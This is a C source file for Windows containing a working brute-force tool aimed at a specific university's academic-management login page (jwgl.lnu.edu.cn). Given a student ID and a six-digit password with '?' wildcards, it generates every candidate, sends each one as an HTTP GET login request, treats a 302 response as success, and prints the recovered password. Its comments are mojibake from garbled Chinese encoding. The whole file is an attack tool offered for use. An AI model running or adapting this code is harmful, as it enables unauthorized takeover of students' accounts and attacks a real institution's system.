#include<winsock.h>
#include<string.h>
#include<stdio.h>
#include<conio.h>
#include<math.h>
#pragma comment(lib, "ws2_32.lib") 
int ShowLast(int last)
{/*������ʵʱ��ʾʣ�������������-1��ʾ�ɹ�������-2��ʾʧ��*/
	char t[7] = {0};
	if (last == -1)
		SetConsoleTitle("Succeed");
	else if (last == -2)
		SetConsoleTitle("Fail");
	else
		SetConsoleTitle(_itoa(last,t,10));
	return 0;
}
int CheckLogin(char *SiteInfo)
{/*���ݴ������ҳ�����ַ����жϱ��γ����Ƿ���ȷ�����ɹ���֤�򷵻�1��ʧ�ܷ���0��������˳��������������-1*/
	if (strstr(SiteInfo,"1.1 302"))//�ɹ����
		return 1;
	else if (strstr(SiteInfo,"close"))//����˹ر�����
		return -1;
	else if (strstr(SiteInfo,"1.1 200"))//ʧ�����
		return 0;
	else
		return -1;
}
int CreatePwdList(char *pwd,char ***pwdList)
{/*���ɴ�ʹ�õ������pwdList��������������������*/
	register int i,ti,j,k=0,n=0,tnum=0;//ͨ��������������ص��������
	int max,min;//�ܴﵽ�������������
	int type=0;//type10:�����λ��type100:�����λ��θ�λ
	for (j=5;j>=0;j--)//����type
	{
		if (pwd[j] == '?')//�����ҵ�ͨ�����������λ��+1
		{
			n++;
			if (j == 0 && pwd[j+1] != '?')//���λΪͨ���
				type += 10;
			else if (j == 0 && pwd[j+1] == '?')//���λ��θ�λΪͨ���
				type += 100;
		}
	}
	switch (type)
	{
	case 0:
		tnum = pow(10.0,n);
		max = tnum - 1;
		min = 0;
		break;
	case 10:
		tnum = 4 * pow(10.0,n-1);
		min = 0;
		max = 4 * pow(10.0,n-1) - 1;
		break;
	case 100:
		tnum = 31 * pow(10.0,n-2);
		min = pow(10.0,n-2);
		max = tnum + min - 1;
		break;
	default:
		break;
	}
	*pwdList = (char**)malloc(tnum*sizeof(char*));
	for (i=0;i<tnum;i++)
		(*pwdList)[i] = (char*)malloc(7*sizeof(char));//��ʼ�������
	for (i=min;i<=max;i++)//��������
	{
		strcpy((*pwdList)[k],pwd);
		ti = i;
		for (j=5;j>=0;j--)
		{
			if ((*pwdList)[k][j] == '?')
			{
				(*pwdList)[k][j] = ti % 10 + '0';
				ti /= 10;
			}
		}
		k++;
	}
	return tnum;
}
long CheckBegin(char *stuid,char *pwd)
{/*���������	pwd(�����ʽ��)����������ʱ��(ms)*/
	char **PwdList = NULL;//ָ�������
	int PwdNum;//�������
	register int i,tnum;//tnum:ʣ���������
	long t;//��������ʱ��

	/*�׽��ֳ�ʼ������*/
	int timeout = 20000;//��ʱ20s
	int TimedOutFlag = 0;
	WSADATA WSAData={0}; 
	SOCKET sockinf; 
	struct sockaddr_in addr; 
	struct hostent *pURL; 
	char header[1024] = {0};//����ͷ
	char sitebuf[2049] = {0};//���ҳ������
	if (WSAStartup(MAKEWORD(2,2),&WSAData))
	{
		printf("\n\n�׽�������ʧ�ܣ�\n");
		return 0;
	}
	pURL = gethostbyname("jwgl.lnu.edu.cn"); 
	if (!pURL)
	{
		printf("\n\n���ͳһ��λ��ʧ�ܣ�\n");
		return 0;
	}
	addr.sin_family = AF_INET; 
	addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr); 
	addr.sin_port = htons(80); 
	sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	setsockopt(sockinf,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(int));//����recv��ʱΪ20s
	connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 

	t = GetTickCount();//�����������ʼ��ʱ
	tnum = PwdNum = CreatePwdList(pwd,&PwdList);//������������ظ���
	printf("\n��%d������������",PwdNum);
	for (i=0;i<PwdNum;i++)
	{
		/*�׽��ֳ�ʼ�����ѯ����Ϊ�˼���*/
		do
		{
			sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: keep-alive\r\n\r\n",stuid,PwdList[i]);
			send(sockinf,header,strlen(header),0); 
			if (recv(sockinf,sitebuf,2048,0) < 0)//���񵽳�ʱ
			{
				TimedOutFlag++;
				if (TimedOutFlag == 3)//��ʱ�ﵽ3��
				{
					if (IDNO == MessageBox(NULL,"����ʱ�����ﵽ3��\n��:�����ȴ�����:�˳�����","Something wrong!",MB_YESNO))
					{
						printf("\n\n�û�ѡ������ֹ����\n");
						goto CLR;//�û�ѡ��ֹͣ����
					}
					sitebuf[0] = 0;
					TimedOutFlag = 0;//�û�ѡ������ȴ���֮��socket����
				}
			}
			else
				TimedOutFlag = 0;
		}while(TimedOutFlag);//��һ�γ�ʱ

		if (CheckLogin(sitebuf) == 1)//��¼�ɹ�����ʾ���˳�ѭ��
		{
			ShowLast(-1);
			printf("\n\n�ҵ���ȷ�����룡\nPwd = %s\n",PwdList[i]);
			break;
		}
		else if (CheckLogin(sitebuf) == -1)//socket����
		{
			closesocket(sockinf);
			sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
			setsockopt(sockinf,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(int));//����recv��ʱΪ60s
			connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
			i--;
		}
		else
			ShowLast(--tnum);//��������ʾʣ���������
	}
	if (i == PwdNum)//�������ȫ�����ԣ�û���ҵ���ȷ������
	{
		ShowLast(-2);
		printf("\n\n��������޷��ҵ���ȷ�����룡\n");
	}
CLR:
	for (i=0;i<PwdNum;i++)
		free(PwdList[i]);//�ͷ��ڴ�
	closesocket(sockinf);//�ر�socket
	WSACleanup();//����׽���
	t = GetTickCount() - t;//����������ʱ��
	return t;
}
int IsRightStr(char *src,char *chk)
{/*���Դ�ַ����Ƿ�ֻ����chk�ַ����е��ַ�*/
	if (strspn(src,chk) == strlen(src))
		return 1;
	return 0;
}

int main()
{
	char stuid[10] = {0};//ѧ��
	char pwd[7] = {0};//����
	long RunTime;//����ʱ��
	int h,m;//ʱ��
	printf("������ѧ�ۺϽ������ϵͳ��¼�����һ�\n--�뱣֤δ�Ĺ�ԭʼ����(���֤����λ)��������Ч\n--��λ��������������1234??��ʾ����123400~123499\n--���볬���޶����Ƚ����ض�\n--��ʼ�һ��������������Զ�����ʣ�ೢ����\n\n");
	do
	{
		printf("�����λ����ѧ�ţ�");
		scanf_s("%s",stuid,10);
	}while(!IsRightStr(stuid,"1234567890"));//ѧ�����벻���Ϲ淶
	do
	{
		printf("������λ����(����/?)��");
		scanf_s("%s",pwd,7);
	}while(!IsRightStr(pwd,"1234567890?"));//�������벻���Ϲ淶
	RunTime = CheckBegin(stuid,pwd);//��ʼ���
	h = RunTime/3600000;//����Сʱ��
	RunTime %= 3600000;
	m = RunTime/60000;//���������
	RunTime %= 60000;
	printf("\n�����ˣ�%dʱ%d��%d��\n",h,m,RunTime/1000);

	system("pause");
	
	return 0;
}